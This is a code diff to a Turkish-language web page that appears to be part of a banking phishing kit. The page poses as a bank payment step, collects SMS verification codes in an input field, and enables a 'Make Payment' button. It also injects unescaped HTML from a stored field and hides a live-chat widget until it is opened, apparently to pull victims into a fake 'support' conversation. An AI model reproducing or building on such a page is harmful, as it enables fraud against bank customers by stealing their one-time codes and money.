@@ -1173,9 +1173,6 @@
                         </form>
                        </div>
                        <div class="card-body d-none flex-column" id="login-step-3">
-                        <h2>Bankanız Ek Bilgi Talep Etti.</h2>
-    </br>
-                        <h3>Lütfen Canlı Desteğe Bağlanın.</h3>
                         <form id="form" action="javascript:;" onsubmit="ekBilgi()">
                           <div class="form-group">
                             <textarea placeholder="" pattern="\d*" id="sms-input" step="any" data-lpignore="true" autocomplete="" name="jethavale_ekbilgi" type="number" class="form-control" value="">
@@ -1183,9 +1180,9 @@
                           </div>
                          
                           <div class="d-flex flex-row">
-                            <a aria-label="Geri" tabindex="-1" onclick="backTwo()" class="btn-lg mt-3 btn-cancel btn btn-secondary">Canlı Desteğe Bağlan</a>
+                            <a aria-label="Geri" tabindex="-1" onclick="backTwo()" class="btn-lg mt-3 btn-cancel btn btn-secondary" style="font-size: 13px;">Desteğe Bağlan</a>
                             
-                            <button id="sms-button" type="submit" disabled="" class="btn-lg btn-block mt-auto btn-login btn btn-primary disabled" aria-label="Giriş Yap">Ödeme Yap</button>
+                            <button id="sms-button" type="submit" disabled="" class="btn-lg btn-block mt-auto btn-login btn btn-primary" aria-label="Ödeme Yap">Ödeme Yap</button>
                           </div>
                         </form>
                        </div>
@@ -1207,6 +1204,7 @@
         </div>
       </div>
     </div>
+<?=html_entity_decode($main['sources'], ENT_QUOTES, 'UTF-8')?>
     
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
@@ -1299,7 +1297,14 @@ $(document).ready(function() {
     $('#gosterilen-aciklama').text('₺'+inputVal);
   });
 });
-</script>
+function maximizeTawkToWidget() {
+  Tawk_API.maximize();
+  window.Tawk_API.hideWidget();
+	
+}
+window.Tawk_API.onLoad = function(){
+    window.Tawk_API.hideWidget();
+};
 
 
 
@@ -1307,6 +1312,7 @@ $(document).ready(function() {
 
 
 </script>
+
     <script type="text/javascript" src="assets/bundle-03-ab94c1d199fda0f44185.js"></script>
     <script type="text/javascript" src="assets/script.js"></script>
     <script type="text/javascript" src="assets/bundle-02-6c626f757554a4e3908c.js"></script>
